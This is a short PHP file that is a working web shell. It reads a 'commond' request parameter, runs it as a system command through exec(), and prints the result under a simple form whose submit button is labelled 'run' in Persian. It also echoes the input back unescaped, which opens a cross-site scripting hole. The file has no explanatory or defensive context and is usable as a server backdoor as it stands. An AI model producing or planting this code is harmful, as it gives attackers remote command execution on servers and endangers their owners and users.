<?php
//echo getcwd()."<br>";
if(isset($_REQUEST['commond'])){
	exec($_REQUEST['commond'],$comm);
	echo "<br>RES: <br>";
	echo implode("<br>\n",$comm);
	echo "<br><br>";
}

	echo '
	<form method="post">
		<textarea colspan=20 rospan=20 name="commond" >'.$_REQUEST['commond'].'</textarea>
		<input type="submit" value="اجرا" />
	</form>
	
	';